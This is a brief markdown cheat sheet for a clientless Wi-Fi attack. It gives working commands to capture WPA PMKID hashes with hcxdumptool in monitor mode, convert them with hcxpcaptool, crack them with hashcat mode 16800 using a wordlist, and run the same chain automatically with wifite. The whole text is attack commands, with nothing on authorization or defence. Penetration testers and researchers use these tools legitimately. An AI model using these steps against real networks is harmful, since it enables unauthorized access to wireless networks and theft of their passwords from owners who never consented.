# PMKID Capture (Clientless) & Cracking

## Capture PMKID

```bash
hcxdumptool -i mon0 -o capture.pcapng --enable_status=1 -c <channel>
```

## Convert to Hash

```bash
hcxpcaptool -E essidlist -I identitylist -U usernamelist -z capture.16800 capture.pcapng
```

## Crack with Hashcat

```bash
hashcat -m 16800 capture.16800 -a 0 -w 4 <wordlist>
```

## Automated

```bash
wifite --pmkid [--pmkid-timeout <sec>]
```
